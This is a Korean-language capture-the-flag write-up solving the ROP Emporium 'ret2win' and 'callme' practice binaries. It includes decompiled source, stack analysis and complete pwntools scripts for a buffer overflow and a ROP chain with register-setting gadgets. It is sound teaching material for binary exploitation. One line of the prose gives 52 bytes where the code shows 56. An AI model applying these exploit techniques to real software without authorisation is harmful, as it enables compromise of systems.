---
title: "ROP Emporium: ret2win and callme"
date: 2019-01-01
description: "ROP Emporium 챌린지 풀이: ret2win(기본 ROP 제어 흐름 탈취), callme(특정 인자로 함수 연속 호출)"
tags: ["ROP", "ROP-Emporium", "pwn", "binary-exploitation", "ret2win", "callme"]
platform: "wargame"
category: "pwn"
difficulty: "easy"
categories: ["CTF"]
authors:
  - name: "ph4nt0m"
    link: "https://github.com/Phantomn"
    image: "https://github.com/Phantomn.png"
---

## ret2win

### 바이너리 정보

```
checksec --file ret2win
[*] '/home/ubuntu/rop_emporium/ret2win/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

NX가 활성화되어 있어 스택에 셸코드를 넣어 실행할 수 없다. PIE가 없으므로 주소가 고정된다. 카나리도 없어 스택 보호가 없다.

### 소스 분석

```c
int ret2win()
{
  puts("Well done! Here's your flag:");
  return system("/bin/cat flag.txt");
}

int pwnme()
{
  char s[32]; // [rsp+0h] [rbp-20h]

  memset(s, 0, 32uLL);
  puts("For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!");
  puts("What could possibly go wrong?");
  puts("You there, may I have your input please? And don't worry about null bytes, we're using read()!\n");
  printf("> ");
  read(0, s, 56uLL);
  return puts("Thank you!");
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("ret2win by ROP Emporium");
  puts("x86_64\n");
  pwnme();
  puts("\nExiting");
  return 0;
}
```

`pwnme`가 32바이트 버퍼에 최대 56바이트를 읽는다. `ret2win` 함수는 호출되면 flag를 출력한다. 카나리가 없고 PIE도 없으므로, 리턴 주소를 `ret2win`의 고정 주소로 덮어쓰기만 하면 된다.

read 함수가 52바이트만큼 입력받으니 pwnme 함수의 ret에 ret2win 함수 주소를 넣으면 끝날 것 같다.

### 스택 레이아웃

```
gef> x/40xg $rsp
0x7fffffffe3f0:  0x4141414141414141  0x4141414141414141
0x7fffffffe400:  0x4141414141414141  0x4141414141414141
0x7fffffffe410:  0x00007fffffffe40a  0x00000000004006d7
0x7fffffffe420:  0x0000000000400780  0x00007ffff7a03bf7
```

```
buf[32] | SFP[8] | ret[8]
```

리턴 주소까지 40바이트 패딩이 필요하고, 그 뒤에 `ret2win` 주소를 넣는다.

### 익스플로잇

```python
from pwn import *

p = process("./ret2win")

ret2win = 0x400756

payload = ''
payload += "A" * 40
payload += p64(ret2win)

print(p.recvuntil("> "))
p.sendline(payload)
p.interactive()
```

---

## callme

### 소스 분석

```c
void __fastcall __noreturn callme_three(__int64 a1, __int64 a2, __int64 a3)
{
  if ( a1 == 0xDEADBEEFDEADBEEF && a2 == 0xCAFEBABECAFEBABE && a3 == 0xD00DF00DD00DF00D )
  {
    // key2.dat 읽기, 버퍼 XOR, flag 출력
    puts(g_buf);
    exit(0);
  }
  puts("Incorrect parameters");
  exit(1);
}

int __fastcall callme_two(__int64 a1, __int64 a2, __int64 a3)
{
  if ( a1 != 0xDEADBEEFDEADBEEF || a2 != 0xCAFEBABECAFEBABE || a3 != 0xD00DF00DD00DF00D )
  {
    puts("Incorrect parameters");
    exit(1);
  }
  // key1.dat 읽기, g_buf 앞 16바이트 XOR
  return puts("callme_two() called correctly");
}

int __fastcall callme_one(__int64 a1, __int64 a2, __int64 a3)
{
  if ( a1 != 0xDEADBEEFDEADBEEF || a2 != 0xCAFEBABECAFEBABE || a3 != 0xD00DF00DD00DF00D )
  {
    puts("Incorrect parameters");
    exit(1);
  }
  // encrypted_flag.dat를 g_buf에 읽기
  return puts("callme_one() called correctly");
}

int pwnme()
{
  char s[32]; // [rsp+0h] [rbp-20h]

  memset(s, 0, 32uLL);
  puts("Hope you read the instructions...\n");
  printf("> ");
  read(0, s, 512uLL);
  return puts("Thank you!");
}
```

세 함수를 **순서대로** — `callme_one`, `callme_two`, `callme_three` — 각각 동일한 인자 `(0xDEADBEEFDEADBEEF, 0xCAFEBABECAFEBABE, 0xD00DF00DD00DF00D)`와 함께 호출해야 한다. x86-64에서 인자는 `rdi`, `rsi`, `rdx` 레지스터로 전달된다.

### 전략

`pwnme` 함수가 최대 512바이트를 읽어 — 완전한 ROP 체인을 넣기에 충분하다. 계획:

1. `pop rdi; pop rsi; pop rdx; ret` 가젯(또는 동등한 것)을 찾는다
2. 각 호출 전에 세 인자 레지스터를 설정한다
3. 체인: `가젯 → 인자 → callme_one → 가젯 → 인자 → callme_two → 가젯 → 인자 → callme_three`

```bash
ROPgadget --binary callme | grep "pop rdi"
```

### 익스플로잇

```python
from pwn import *

p = process("./callme")
elf = ELF("./callme")

# ROP 가젯: pop rdi; pop rsi; pop rdx; ret
pop_rdi_rsi_rdx = 0x0000000000401ab0

callme_one   = elf.sym['callme_one']
callme_two   = elf.sym['callme_two']
callme_three = elf.sym['callme_three']

arg1 = 0xDEADBEEFDEADBEEF
arg2 = 0xCAFEBABECAFEBABE
arg3 = 0xD00DF00DD00DF00D

def call_with_args(func_addr):
    chain  = p64(pop_rdi_rsi_rdx)
    chain += p64(arg1)
    chain += p64(arg2)
    chain += p64(arg3)
    chain += p64(func_addr)
    return chain

payload  = b"A" * 40
payload += call_with_args(callme_one)
payload += call_with_args(callme_two)
payload += call_with_args(callme_three)

p.recvuntil("> ")
p.sendline(payload)
p.interactive()
```

핵심은 x86-64에서 처음 세 인자가 각각 `rdi`, `rsi`, `rdx`를 통해 전달된다는 것이다. 체인의 각 함수 호출은 단일 pop 가젯으로 해당 레지스터들을 먼저 설정한 후 목표 함수를 호출한다.
